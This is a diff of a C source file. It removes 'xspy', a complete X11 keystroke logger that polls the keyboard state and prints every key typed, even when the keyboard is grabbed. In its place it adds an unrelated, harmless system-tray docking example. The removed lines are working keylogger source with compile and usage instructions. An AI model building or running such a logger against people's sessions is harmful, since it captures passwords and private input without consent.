@@ -1,271 +1,90 @@
-// to compile run "gcc -o xspy -lX11 xspy.c"
-/*
-   xspy
-   Jon A. Maxwell (JAM)
-   jmaxwell@acm.vt.edu
-   Monitors keystrokes even the keyboard is grabbed.
-*/
+/* --------- XEMBED and systray stuff */
+#define SYSTEM_TRAY_REQUEST_DOCK   0
+#define SYSTEM_TRAY_BEGIN_MESSAGE   1
+#define SYSTEM_TRAY_CANCEL_MESSAGE  2
 
+static int trapped_error_code = 0;
+static int (*old_error_handler) (Display *, XErrorEvent *);
 
-/*
-   xspy polls the keyboard to determine the state of all keys on
-   the keyboard.  By comparing results it determines which key has
-   been pressed and what modifiers are in use.  In this way it
-   echos to the user all keystrokes typed.
-
-   xspy is freely distributable, provided the source remains intact.
-*/
-
-#include <X11/Xlib.h>
-#include <X11/X.h>
-
-#include <string.h>
-#include <stdio.h>
-#include <stdlib.h>
-
-#define VERSION "1.0c"
-#define DEFAULT_DISPLAY ":0"
-#define DEFAULT_DELAY   10000
-#define BIT(c, x)   ( c[x/8]&(1<<(x%8)) )
-#define TRUE    1
-#define FALSE   0
-
-#define KEYSYM_STRLEN   64
-
-#define SHIFT_DOWN  1
-#define LOCK_DOWN   5
-#define CONTROL_DOWN    3
-#define ISO3_DOWN    4
-#define MODE_DOWN    5
-
-/* I think it is pretty standard */
-#define SHIFT_INDEX 1  /*index for XKeycodeToKeySym(), for shifted keys*/
-#define MODE_INDEX 2
-#define MODESHIFT_INDEX 3
-#define ISO3_INDEX 4 //TODO geht leider nicht??
-#define ISO3SHIFT_INDEX 4
-
-/* Global variables */
-extern Display *disp;
-extern int PrintUp;
-
-Display *disp;
-int PrintUp  =FALSE;
-
-char *KeyCodeToStr(int code, int down, int mod);
-
-int usage() {
-   printf("%s\n%s\n%s\n%s\n%s%s%s\n",
-          "USAGE: xspy -display <display> -delay <usecs> -up",
-          "       Options: display, specifies an X display.",
-          "           delay, determines the polling frequency (.1 sec is 100000 usecs)",
-          "           up, gives up transitions for some keys.",
-          "       Version ",VERSION, ", by JAM");
-   exit(0);
+static int
+error_handler(Display     *display, XErrorEvent *error) {
+    trapped_error_code = error->error_code;
+    return 0;
 }
 
-
-
-int main(int argc, char *argv[]) {
-   char    *hostname=DEFAULT_DISPLAY,
-           *char_ptr,
-           buf1[32],   buf2[32],
-           *keys,
-           *saved;
-   int i,  delay=DEFAULT_DELAY;
-
-   /* get args */
-   for (i=1; i<argc; i++) {
-      if (!strcmp(argv[i], "-help")) usage();
-      else if (!strcmp(argv[i], "-display")) {
-         i++;
-         hostname=argv[i];
-      }
-      else if (!strcmp(argv[i], "-delay")) {
-         i++;
-         delay=atoi(argv[i]);
-      }
-      else if (!strcmp(argv[i], "-up"))   {PrintUp  =TRUE;}
-      else usage();
-   }
-
-   /* setup Xwindows */
-   disp=XOpenDisplay(hostname);
-   if (NULL==disp) {
-      fprintf(stderr, "Cannot open X display: %s\n", hostname);
-      exit(1);
-   }
-   XSynchronize(disp, TRUE);
-
-   /* setup buffers */
-   saved=buf1; keys=buf2;
-   XQueryKeymap(disp, saved);
-
-   while (1) {
-      /* find changed keys */
-      XQueryKeymap(disp, keys);
-      for (i=0; i<32*8; i++) {
-         if (BIT(keys, i)!=BIT(saved, i)) {
-            register char *str;
-            str=(char *)KeyCodeToStr(i, BIT(keys, i), KeyModifiers(keys));
-            if (BIT(keys, i)!=0 || PrintUp) printf("%s\n",str);
-            fflush(stdout); /* in case user is writing to a pipe */
-         }
-      }
-
-      /* swap buffers */
-      char_ptr=saved;
-      saved=keys;
-      keys=char_ptr;
-
-      usleep(delay);
-   }
+void
+trap_errors(void) {
+    trapped_error_code = 0;
+    old_error_handler = XSetErrorHandler(error_handler);
 }
 
-
-/* This part takes the keycode and makes an output string. */
-
-/*
-   Have a keycode, Look up keysym for it.
-   Convert keysym into its string representation.
-   if string is more than one character try to reduce it to one.
-   if string still is more than one character, put it into the form
-   (+string) or (-string) depending on whether the key is up or down.
-   print out the string.
-*/
-
-struct conv {char from[20], to[5];} conv_table[] = {
-   /* shift & control replaced with nothing, since they are appearent
-      from the output */
-   {"return",""},    {"escape","^["},    {"delete", "^H"},
-   {"shift",""},       {"control",""},     {"tab","\t"},
-   {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""}, 
-   {"numbersign", "#"},{"dollar", "$"},    {"percent", "%"},
-   {"ampersand", "&"}, {"apostrophe", "'"},{"parenleft", "("}, 
-   {"parenright", ")"},{"asterisk", "*"},  {"plus", "+"},
-   {"comma", ","},     {"minus", "-"},     {"period", "."},    
-   {"slash", "/"},     {"colon", ":"},     {"semicolon", ";"}, 
-   {"less", "<"},      {"equal", "="},     {"greater", ">"},   
-   {"question", "?"},  {"at", "@"},        {"bracketleft", "["},
-   {"backslash", "\\"},{"bracketright", "]"},{"asciicircum", "^"},   
-   {"underscore", "_"},{"grave", "`"},     {"braceleft", "{"}, 
-   {"bar", "|"},       {"braceright", "}"},{"asciitilde", "~"},    
-   {"odiaeresis","Ã¶"},{"udiaeresis","Ã¼"},{"adiaeresis","Ã¤"},{"",""}
-};
-
-int StrToChar(char *data) {
-   int i=0;
-   while (conv_table[i].from[0]!=0 || conv_table[i].to[0]!=0) {
-      if (!strncasecmp(data,conv_table[i].from,
-                       strlen(conv_table[i].from)) ) {
-         strcpy(data,  conv_table[i].to);
-         return TRUE;
-      }
-      i++;
-   }
-   return FALSE;
+int
+untrap_errors(void) {
+    XSetErrorHandler(old_error_handler);
+    return trapped_error_code;
 }
 
-char *KeyCodeToStr(int code, int down, int mod) {
-   static char *str, buf[KEYSYM_STRLEN+1];
-   int index;
-   KeySym  keysym;
-   /* get the keysym for the appropriate case */
-	switch (mod) {
-		case SHIFT_DOWN:
-			index=SHIFT_INDEX;
-			break;
-		case ISO3_DOWN:
-			index=ISO3_INDEX;
-			break;
-		case MODE_DOWN:
-			index=MODE_INDEX;
-			break;
-		default:
-			index=0;
-	}
+void
+send_systray_message(Display* dpy, long message, long data1, long data2, long data3) {
+    XEvent ev;
 
+    Atom selection_atom = XInternAtom (dpy,"_NET_SYSTEM_TRAY_S0",False);
+    Window tray = XGetSelectionOwner (dpy,selection_atom);
 
-   keysym=XKeycodeToKeysym(disp, code, index);
-   if (NoSymbol==keysym) return "";
+    if ( tray != None)
+        XSelectInput (dpy,tray,StructureNotifyMask);
 
-   /* convert keysym to a string, copy it to a local area */
-   str=XKeysymToString(keysym);
+    memset(&ev, 0, sizeof(ev));
+    ev.xclient.type = ClientMessage;
+    ev.xclient.window = tray;
+    ev.xclient.message_type = XInternAtom (dpy, "_NET_SYSTEM_TRAY_OPCODE", False );
+    ev.xclient.format = 32;
+    ev.xclient.data.l[0] = CurrentTime;
+    ev.xclient.data.l[1] = message;
+    ev.xclient.data.l[2] = data1; // <--- your window is only here
+    ev.xclient.data.l[3] = data2;
+    ev.xclient.data.l[4] = data3;
 
-   if (strcmp(str,"ISO_Level3_Shift") == 0) {
-		keysym=XKeycodeToKeysym(disp, code, ISO3_INDEX);
-		str=XKeysymToString(keysym);
-   }
-
-   if (NULL==str) return "";
-   strncpy(buf, str, KEYSYM_STRLEN); buf[KEYSYM_STRLEN]=0;
-
-   /* try to reduce strings to character equivalents */
-   if (buf[1]!=0 && !StrToChar(buf)) {
-	if (strcmp(buf, "Caps_Lock") == 0) return "";
-      /* still a string, so put it in form (+str) or (-str) */
-      if (down) strcpy(buf, "(+");
-      else      strcpy(buf, "(-");
-      strcat(buf, str);
-      strcat(buf, ")");
-      return buf;
-   }
-   if (buf[0]==0) return "";
-   if (mod==CONTROL_DOWN) {
-      buf[2]=0;
-      buf[1]=toupper(buf[0]);
-      buf[0]='^';
-   }
-   if (mod==LOCK_DOWN) {buf[0]=toupper(buf[0]);}
-   return buf;
+    trap_errors();
+    XSendEvent(dpy, tray, False, NoEventMask, &ev);
+    XSync(dpy, False);
+    usleep(10000);
+    if (untrap_errors()) {
+        /* Handle errors */
+    }
 }
 
+/* ------------ Regular X stuff */
+int
+main(int argc, char **argv) {
+    int width, height;
+    XWindowAttributes wa;
+    XEvent ev;
+    Display *dpy;
+    int screen;
+    Window root, win;
 
-/* returns which modifier is down, shift/caps or control */
-int KeyModifiers(char *keys) {
-   static int setup=TRUE;
-   static int width;
-   static XModifierKeymap *mmap;
-   int i;
+    /* init */
+    if (!(dpy=XOpenDisplay(NULL)))
+        return 1;
+    screen = DefaultScreen(dpy);
+    root = RootWindow(dpy, screen);
+    if(!XGetWindowAttributes(dpy, root, &wa))
+        return 1;
+    width = height = MIN(wa.width, wa.height);
 
-   if (setup) {
-      setup=FALSE;
-      mmap=XGetModifierMapping(disp);
-      width=mmap->max_keypermod;
-   }
-   for (i=0; i<width; i++) {
-      KeyCode code;
+    /* create window */
+    win = XCreateSimpleWindow(dpy, root, 0, 0, width, height, 0, 0, 0x7F7F997F);
 
-      code=mmap->modifiermap[ControlMapIndex*width+i];
-      if (code && 0!=BIT(keys, code)) {return CONTROL_DOWN;}
+    send_systray_message(dpy, SYSTEM_TRAY_REQUEST_DOCK, win, 0, 0); // pass win only once
+    XMapWindow(dpy, win);
 
-      code=mmap->modifiermap[ShiftMapIndex*width  +i];
-      if (code && 0!=BIT(keys, code)) {return SHIFT_DOWN;}
+    XSync(dpy, False);
 
-      code=mmap->modifiermap[LockMapIndex*width   +i];
-      if (code && 0!=BIT(keys, code)) {return LOCK_DOWN;}
-      
-			code=mmap->modifiermap[Mod3MapIndex*width   +i];
-      if (code && 0!=BIT(keys, code)) {return ISO3_DOWN;}
-      
-			code=mmap->modifiermap[Mod5MapIndex*width   +i];
-      if (code && 0!=BIT(keys, code)) {return MODE_DOWN;}
-   }
-   return 0;
+    /* run */
+    while(1) {
+        while(XPending(dpy)) {
+            XNextEvent(dpy, &ev); /* just waiting until we error because window closed */
+        }
+    }
 }
-
-
-/* if usleep is missing
-
-include <sys/types.h>
-include <sys/time.h>
-
-void usleep(x) {
-   struct timeval  time;
-
-   time.tv_sec= x/1000000;
-   time.tv_usec=x%1000000;
-   select(0, NULL, NULL, NULL, &time);
-}
-
-*/
